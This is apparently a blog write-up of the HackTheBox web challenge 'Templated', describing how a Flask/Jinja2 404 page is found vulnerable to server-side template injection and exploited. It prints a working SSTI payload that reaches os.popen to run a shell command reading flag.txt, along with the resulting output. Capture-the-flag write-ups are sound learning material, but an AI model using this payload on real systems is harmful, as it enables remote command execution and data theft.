---
title: "Templated"
date: 2022-09-20T15:03:31+01:00
draft: false
categories:
  - HackTheBox
---


Another great web challenge.

the website could not make it more obvious 

google `flask/jinja2` exploit or vulerability

Seems like its `template injection` (SSTI)

you can read [this](https://www.onsecurity.io/blog/server-side-template-injection-with-jinja2/)

and also [this](https://secure-cookie.io/attacks/ssti/#tldr---show-me-the-fun-part) one if you want!  

But where do i inject the code? Inspecting the source code gives nothing

fiddling a bit with the url path we notice the `404 page` renders whatever is added to path

that's it! we need to do it directly in the url path

I tried this:
`http://178.62.54.69:30320/{{7*7}}`

And got that
```
Error 404

The page '49' could not be found

```

you got it! 7*7 got executed! now its free real estate!

Our magic payload looks like this! modify at will and append it to url path

```
{{"".__class__.__mro__[1].__subclasses__()[186].__init__.__globals__["__builtins__"]["__import__"]("os").popen("cat flag.txt").read()}}
```
Profit!

```
Error 404

The page 'HTB{t3mpl4t3_0f_fl4g_h3r3!} ' could not be found
```
Yeah this challenge was actually easy...even for HTB standards

